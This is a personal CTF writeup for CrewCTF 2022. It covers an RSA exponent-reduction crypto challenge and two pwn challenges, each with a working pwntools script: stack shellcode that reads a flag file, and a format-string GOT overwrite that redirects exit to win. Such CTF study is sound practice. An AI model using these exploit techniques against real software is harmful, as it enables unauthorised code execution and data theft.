---
title: "CrewCTF2022 Writeup"
date: 2022-04-18T02:29:57+08:00
summary: The HUGE e, Wiznu, Ubeme
categories: ["writeup"]
---

# CrewCTF2022 Writeup

Played CrewCTF2022 this weekend and solved some trivial challenges, recorded them here for remembering what I have done this weekend.

## The HUGE e

```python
from Cryptodome.Util.number import getPrime, bytes_to_long, inverse, isPrime
from secret import flag

m = bytes_to_long(flag)

def getSpecialPrime():
    a = 2
    for i in range(40):
        a*=getPrime(20)
    while True:
        b = getPrime(20)
        if isPrime(a*b+1):
            return a*b+1


p = getSpecialPrime()
e1 = getPrime(128)
e2 = getPrime(128)
e3 = getPrime(128)

e = pow(e1,pow(e2,e3))
c = pow(m,e,p)

assert pow(c,inverse(e,p-1),p) == m

print(f'p = {p}')
print(f'e1 = {e1}')
print(f'e2 = {e2}')
print(f'e3 = {e3}')
print(f'c = {c}')
```

I thought this challenge aims to test whether I know using ecm method to factor a big integer, however, I was wrong. The default factor method of sagemath is great. What matters is how to compute `e` efficiently. What we only need is \\(e \mod phi(p)\\) so we need to make \\(e2 \cdot e3\\) smaller. We can use Euler's theorem to solve the problem. As \\(e_1^{phi(phi(p))} \equiv 1 \mod phi(p)\\), we just need to compute \\(e_2^{e_3} \mod phi(phi(p))\\). Now we are done.

```python
from Cryptodome.Util.number import long_to_bytes

p = 127557933868274766492781168166651795645253551106939814103375361345423596703884421796150924794852741931334746816404778765897684777811408386179315837751682393250322682273488477810275794941270780027115435485813413822503016999058941190903932883823
e1 = 219560036291700924162367491740680392841
e2 = 325829142086458078752836113369745585569
e3 = 237262361171684477270779152881433264701
c = 962976093858853504877937799237367527464560456536071770645193845048591657714868645727169308285896910567283470660044952959089092802768837038911347652160892917850466319249036343642773207046774240176141525105555149800395040339351956120433647613

phi = p - 1
e = e1.powermod(e2.powermod(e3, euler_phi(phi)), phi)

d = inverse_mod(e, phi)
m = c.powermod(d,p)

print(long_to_bytes(m))
```

## Wiznu

There is a stack overflow problem which can be found easily. What's more, there is no NX. As a result, we can just inject shellcode to stack, and return to stack. The problem is I don't know where the flag is at first and this problem is addressed after asking the admin and resulting in a challenge update. Although the challenge is quite straightforward, I met several problems. Because the ASLR, debug is hard without pwntools. I met a quirk problem when using pwntools, which is I cannot break at `printf` because an unknown segfault. I solved this problem using one of feature of GDB, disabling ASLR, so, I can debug without pwntools. 

```python
import re
import pwn
pwn.context.update(arch='amd64', os='linux', encoding='utf-8')

my_pattern = re.compile("Special Gift for Special Person : (0x[0-9a-f]*)")

buffer_len = 0x108

# with pwn.process("./chall") as io:
with pwn.remote("wiznu.crewctf-2022.crewc.tf", 1337) as io:
    r = io.recvline()
    print(r.decode())
    addr = int(my_pattern.search(r.decode()).group(1), 16)
    print(hex(addr))

    shellcode = pwn.asm(f"""
    mov rax, 2
    mov rbx, 0x67616c662f66
    push rbx
    mov rbx, 0x74632f656d6f682f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    syscall
    mov rbx, rax
    mov rax, 0
    mov rdi, rbx
    mov rsi, {addr - 40}
    mov rdx, 40
    syscall
    mov rax, 1
    mov rdi, 1
    mov rsi, {addr - 40}
    mov rdx, 40
    syscall
    """)

    print(len(shellcode))

    io.send(shellcode.ljust(buffer_len, b'\x00') + pwn.p64(addr))

    r = io.recvrepeat(1)
    print(r)
```

## Ubume

I found a `win()` function in symbols so I should redirect the control flow to it. In addition, there is a format string vulnerability in the binary and a call to `exit()` just after the vulnerability. A straightforward idea is using the vulnerability to change the GOT of `exit()` to the address of `win()`. It's possible because of no PIE. 

```python
import pwn

def fmt_str_64(init : bytes, offset, target, addr):
    res = init
    offset += 14
    prev = len(init)
    format_string = b""
    for i in range(8):
        t = (addr >> (8 * i)) & 0xff
        pad = (t - prev) % 256
        if pad == 0:
            format_string += (f"%{offset + i}$hhn").encode()
        else:
            format_string += (f"%0{pad}c%{offset + i}$hhn").encode()
        prev = t
    padded = format_string.ljust(112, b"a")
    res += padded
    for i in range(8):
        res += pwn.p64(target + i)
    return res

win_addr = 0x0040070a

exit_addr = 0x00601040

payload = fmt_str_64(b"", 6, exit_addr, win_addr)

# with pwn.process("./chall") as io:
with pwn.remote("ubume.crewctf-2022.crewc.tf", 1337) as io:
    io.send(payload)
    io.interactive()
```

